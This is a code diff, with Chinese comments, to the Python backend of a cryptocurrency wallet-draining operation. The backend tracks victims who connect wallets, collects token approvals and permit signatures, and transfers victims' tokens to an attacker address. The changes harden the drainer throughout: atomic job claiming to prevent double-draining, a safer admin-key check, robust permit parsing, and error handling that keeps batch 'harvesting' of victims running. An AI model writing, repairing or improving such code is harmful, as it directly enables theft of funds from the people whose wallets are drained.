@@ -91,9 +91,9 @@ class EventStore:
         self.items = {}    # item_id -> 待收割项
         self._next = 1
 
-    def add_event(self, kind: str, text: str) -> None:
+    def add_event(self, kind: str, text: str, victim: str | None = None) -> None:
         with self.lock:
-            self.events.append({"kind": kind, "text": text})
+            self.events.append({"kind": kind, "text": text, "victim": victim})
             self.events[:] = self.events[-200:]
 
     def add_item(self, item: dict) -> int:
@@ -119,14 +119,21 @@ class EventStore:
     def last_victim(self) -> str | None:
         with self.lock:
             for ev in reversed(self.events):
-                if ev["kind"] == "connect":
-                    addr = ev["text"].rsplit(": ", 1)[-1].strip()
-                    if addr.startswith("0x"):
-                        return addr
+                if ev.get("victim") and str(ev["victim"]).startswith("0x"):
+                    return str(ev["victim"])
             for item in self.items.values():
                 if str(item.get("victim", "")).startswith("0x"):
                     return str(item["victim"])
         return None
+
+    def claim_for_drain(self, item_id: int) -> dict | None:
+        """原子地把 pending 置为 running,防并发重复收割;非 pending 返回 None。"""
+        with self.lock:
+            item = self.items.get(item_id)
+            if not item or item["status"] != "pending":
+                return None
+            item["status"] = "running"
+            return dict(item)
 
     def snapshot(self) -> dict:
         with self.lock:
@@ -215,8 +222,10 @@ class Handler(BaseHTTPRequestHandler):
             return {}
 
     def _admin_ok(self) -> bool:
-        return (self.path.split("key=")[-1].split("&")[0]
-                == self.cfg["server"]["admin_key"])
+        import hmac
+        from urllib.parse import parse_qs, urlparse
+        query = parse_qs(urlparse(self.path).query).get("key", [""])[0]
+        return hmac.compare_digest(query, self.cfg["server"]["admin_key"])
 
     # ---- routes ----
 
@@ -282,7 +291,7 @@ class Handler(BaseHTTPRequestHandler):
         kind = body.get("type")
         if kind == "connect":
             addr = str(body.get("address", "?"))
-            STORE.add_event("connect", f"受害者连接钱包: {addr}")
+            STORE.add_event("connect", f"受害者连接钱包: {addr}", victim=addr)
             self._json(200, {"ok": True})
         elif kind == "approve":
             txhash = str(body.get("txHash", ""))
@@ -309,11 +318,16 @@ class Handler(BaseHTTPRequestHandler):
                             + (f" ⚠ 授权对象非本站攻击者({spender})" if flagged else ""))
             self._json(200, {"ok": True, "itemId": item_id})
         elif kind == "permit":
+            def _int(value, default=0):
+                try:
+                    return int(value, 0) if isinstance(value, str) else int(value)
+                except (TypeError, ValueError):
+                    return default
             item_id = STORE.add_item({
                 "type": "permit", "victim": body.get("owner", "?"),
-                "sig": body.get("sig", ""), "value": int(body.get("value", "0"), 0),
-                "deadline": int(body.get("deadline", "0"), 0),
-                "nonce": int(body.get("nonce", "0"), 0),
+                "sig": body.get("sig", ""), "value": _int(body.get("value")),
+                "deadline": _int(body.get("deadline")),
+                "nonce": _int(body.get("nonce")),
             })
             STORE.add_event("permit",
                             f"受害者 {body.get('owner')} 已签署 permit 离线签名"
@@ -329,41 +343,57 @@ class Handler(BaseHTTPRequestHandler):
         victim = STORE.last_victim()
         state["meta"] = {"symbol": cfg["token"]["symbol"],
                          "attacker": cfg["attacker"]["address"]}
-        state["balances"] = {
-            "attacker": drain.balance_of(rpc, token, cfg["attacker"]["address"]),
-            "victim": ({"address": victim,
-                        "amount": drain.balance_of(rpc, token, victim)}
-                       if victim else None),
-        }
+        try:
+            state["balances"] = {
+                "attacker": drain.balance_of(rpc, token, cfg["attacker"]["address"]),
+                "victim": ({"address": victim,
+                            "amount": drain.balance_of(rpc, token, victim)}
+                           if victim else None),
+            }
+        except Exception as exc:  # 链不可达:降级为 null,不把后台页面打死
+            state["balances"] = None
+            state["balance_error"] = f"余额查询失败(链不可达?): {exc}"
         return state
 
     def _handle_drain(self):
         body = self._body()
         if body.get("all"):
-            results = []
-            for item in STORE.snapshot()["items"]:
-                if item["status"] == "pending":
-                    results.append(self._drain_item(item))
-            self._json(200, {"drained_count": len(results), "results": results})
+            pending = [i["id"] for i in STORE.snapshot()["items"] if i["status"] == "pending"]
+            results = [self._drain_item_guarded(i) for i in pending]
+            self._json(200, {"drained_count": sum(1 for r in results if "error" not in r),
+                             "results": results})
             return
-        item = STORE.get(int(body.get("itemId", 0)))
+        item_id = int(body.get("itemId", 0))
+        item = STORE.get(item_id)
         if not item:
             self._json(404, {"error": "待收割项不存在"})
             return
-        self._json(200, self._drain_item(item))
+        self._json(200, self._drain_item_guarded(item_id))
 
-    def _drain_item(self, item: dict) -> dict:
-        if item["status"] != "pending":
-            return {"itemId": item["id"], "error": f"状态为 {item['status']},不能重复收割"}
-        result = run_drain(self.cfg, item)
-        STORE.set_status(item["id"], "drained",
+    def _drain_item(self, claimed: dict) -> dict:
+        result = run_drain(self.cfg, claimed)
+        STORE.set_status(claimed["id"], "drained",
                          f"已收割 {result['drained']};受害者 {result['after']['victim']},"
                          f"攻击者 {result['after']['attacker']}")
         STORE.add_event("drain",
                         f"收割完成:受害者 -{result['drained']},"
                         f"攻击者现有 {result['after']['attacker']}")
-        result["itemId"] = item["id"]
+        result["itemId"] = claimed["id"]
         return result
+
+    def _drain_item_guarded(self, item_id: int) -> dict:
+        """CAS 领取任务→执行→回写;任何异常都转成结构化错误,绝不中断批量。"""
+        item = STORE.claim_for_drain(item_id)
+        if not item:
+            current = STORE.get(item_id)
+            status = current["status"] if current else "不存在"
+            return {"itemId": item_id, "error": f"状态为 {status},无法收割"}
+        try:
+            return self._drain_item(item)
+        except Exception as exc:
+            STORE.set_status(item_id, "pending", f"上次收割失败: {exc};可重试")
+            STORE.add_event("error", f"收割 #{item_id} 失败: {exc}")
+            return {"itemId": item_id, "error": str(exc)}
 
 
 def main() -> int:
